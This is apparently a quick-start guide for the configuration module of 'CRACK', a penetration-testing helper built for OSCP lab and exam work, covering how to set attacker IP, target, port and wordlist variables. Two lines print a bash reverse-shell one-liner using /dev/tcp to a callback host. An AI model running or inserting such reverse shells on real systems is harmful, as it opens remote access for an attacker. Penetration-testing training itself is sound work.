# CRACK Config - Quick Start Guide

## 5-Minute Setup

### 1. Auto-Configure (Fastest)
```bash
# Auto-detect network settings
crack config auto
```
**Result:** LHOST and INTERFACE automatically detected

### 2. Interactive Setup (Recommended for OSCP)
```bash
# Guided wizard for all common variables
crack config setup
```
**Prompts:**
1. Auto-detects LHOST and INTERFACE
2. Asks for TARGET IP
3. Asks for LPORT (default: 4444)
4. Asks for WORDLIST (default: rockyou.txt)
5. Asks for THREADS (default: 10)
6. Optional: WPSCAN_API_TOKEN

### 3. Manual Configuration
```bash
# Set variables individually
crack config set LHOST 10.10.14.5
crack config set TARGET 192.168.45.100
crack config set LPORT 4444
crack config set WORDLIST /usr/share/wordlists/dirb/common.txt
```

## Verification

```bash
# List all configured variables
crack config list

# List specific category
crack config list network
crack config list web

# Get single variable
crack config get LHOST

# Validate all values
crack config validate
```

## Common OSCP Workflows

### Pre-Exam Setup
```bash
# 1. Auto-detect your VPN IP
crack config auto

# 2. Set exam-specific values
crack config set TARGET 192.168.x.x
crack config set LPORT 443  # Use common port to avoid firewall

# 3. Verify
crack config validate
```

### During Exam
```bash
# Quick target switch
crack config set TARGET 192.168.x.y

# Get your callback IP
crack config get LHOST
# Output: LHOST = 10.10.14.5

# Copy for reverse shells
echo "bash -i >& /dev/tcp/$(crack config get LHOST | cut -d'=' -f2 | tr -d ' ')/$(crack config get LPORT | cut -d'=' -f2 | tr -d ' ') 0>&1"
```

### Post-Exam Reset
```bash
# Clear all except defaults
crack config clear --keep-defaults

# Or start fresh
crack config setup
```

## Integration with Other Tools

### With Reference Module
```bash
# Set config variables
crack config set LHOST 10.10.14.5
crack config set TARGET 192.168.45.100

# Use in reference commands (auto-fills <LHOST> and <TARGET>)
crack reference --fill bash-reverse-shell
# Output: bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### With Track Module (Future)
```bash
# Track will automatically use shared config
crack track --tui 192.168.45.100
# LHOST already configured, no need to enter again
```

## Categories Overview

### Network (12 variables)
Critical for OSCP: `LHOST`, `LPORT`, `TARGET`, `INTERFACE`

### Web (11 variables)
Common: `URL`, `WORDLIST`, `THREADS`, `WPSCAN_API_TOKEN`

### Credentials (6 variables)
For brute force: `USERNAME`, `PASSWORD`, `CREDFILE`

### Enumeration (7 variables)
Service-specific: `SNMP_COMMUNITY`, `SHARE`, `SERVICE`

### Exploitation (4 variables)
For exploits: `PAYLOAD`, `CVE_ID`

### File Transfer (8 variables)
Common: `LOCAL_PATH`, `OUTPUT_DIR`

### SQL Injection (4 variables)
For SQLi: `DATABASE`, `NULL_COLUMNS`

### Miscellaneous (16 variables)
Generic: `OUTPUT`, `DIR`, `SCRIPT`

## Tips & Tricks

### 1. View by Category
```bash
# Only see network-related variables
crack config list network

# Only see web-related variables
crack config list web
```

### 2. Validation Prevents Errors
```bash
# This will fail validation
crack config set LHOST invalid
# Output: ✗ Error: Invalid IP format

# This works
crack config set LHOST 10.10.14.5
# Output: ✓ Set LHOST = 10.10.14.5
```

### 3. Export/Import for Team
```bash
# Export your config
crack config export oscp-exam.json

# Share with team member
scp oscp-exam.json teammate@host:/tmp/

# Teammate imports
crack config import /tmp/oscp-exam.json --merge
```

### 4. Quick Network Detection
```bash
# If VPN disconnects and reconnects
crack config auto
# Automatically updates LHOST to new IP
```

### 5. Alias Support
```bash
# Old names still work (backward compatible)
crack config set COMMUNITY public
# Automatically resolves to SNMP_COMMUNITY

crack config get SNMP_COMMUNITY
# Output: SNMP_COMMUNITY = public
```

## Troubleshooting

### "Config file not found"
```bash
# First run creates default config
crack config auto
# Creates ~/.crack/config.json
```

### "Validation failed"
```bash
# Check what's wrong
crack config validate

# See error details
crack config list
```

### "Variable not updating"
```bash
# Verify save
crack config set VAR value
# Should see: "Config saved to: ~/.crack/config.json"

# Check file directly
cat ~/.crack/config.json | jq '.variables.VAR'
```

### "Auto-detection not working"
```bash
# Manually set if auto-detect fails
ip addr show tun0  # Get your VPN IP
crack config set LHOST 10.10.14.5
crack config set INTERFACE tun0
```

## File Locations

- **Config:** `~/.crack/config.json`
- **Module:** `crack/config/`
- **Documentation:** `crack/config/README.md`

## Support

```bash
# Show all available commands
crack config

# Show categories
crack config categories

# Get help on specific command
crack config list --help
```

---

**Pro Tip:** Run `crack config setup` once at start of OSCP labs, then just update `TARGET` as you move between machines!
